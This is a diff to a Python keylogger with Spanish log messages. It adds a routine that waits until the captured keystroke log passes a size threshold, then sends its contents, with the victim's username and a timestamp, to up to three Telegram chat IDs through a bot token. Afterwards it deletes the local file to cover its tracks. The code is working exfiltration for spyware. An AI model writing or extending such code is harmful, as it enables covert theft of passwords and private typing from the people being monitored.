@@ -130,9 +130,11 @@ class Functions:
             print("[LenghtText] Se encontró el Archivo "+Config().LOG_NAME+ " correctamente")
             if LEN_TEXT > Config.TelegramBot().LEN_TEXT:
                 print("[LenghtText] La cantidad de caracteres es superior a: "+str(LEN_TEXT))
+                regk.close()
                 return True
             else:
                 print("[LenghtText] La cantidad de caracteres es es inferior a: " + str(LEN_TEXT))
+                regk.close()
                 return False
         except:
             print("[LenghtText] No se encontró el Archivo " + Config().LOG_NAME)
@@ -216,18 +218,36 @@ class Util:
             os.remove(homedir)
 
     def TelegramBot(self):
+        print("[TelegramBot] start....")
+        if Functions().LenghtText():
+            pathN = Functions().RamdomLogNamePATH()
+            os.rename(Config().PATH_LOG, pathN)
+            # Abre el archivo
+            f = open(pathN, 'r')
 
+            def SendT(ID):
+                try:
+                    bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
+                    bot.send_message(ID, "User: " + str(getuser()) + "\nDate: " + Functions().CurrentTime() + "\n\r\n\r\n\r\n" + f.read())
+                    print("[TelegramBot] se envió a Telegram [ID] = " + str(ID))
+                except:
+                    print("[TelegramBot] no se pudo enviar el archivo [ID] = " + str(ID))
 
-        print("[TelegramBot] ")
+            print("[TelegramBot] Intentado enviar...")
+            if Config.TelegramBot().ID != 000000000:
+                SendT(Config.TelegramBot().ID)
 
+            if Config.TelegramBot().ID_2 != 000000000:
+                SendT(Config.TelegramBot().ID_2)
 
+            if Config.TelegramBot().ID_3 != 000000000:
+                SendT(Config.TelegramBot().ID_3)
 
-        if len(regk.read()) > Config.TelegramBot().LEN_TEXT :
-
+            f.close()
+            os.remove(pathN)
+            print("[TelegramBot] Se eliminó el archivo caché correctamente")
         else:
-            print("[TelegramBot] El registro de teclas no tiene la cantidad de texto mínimo para ser enviado ")
-
-
+            pass
 
     def MySQL(self):
         exito = False
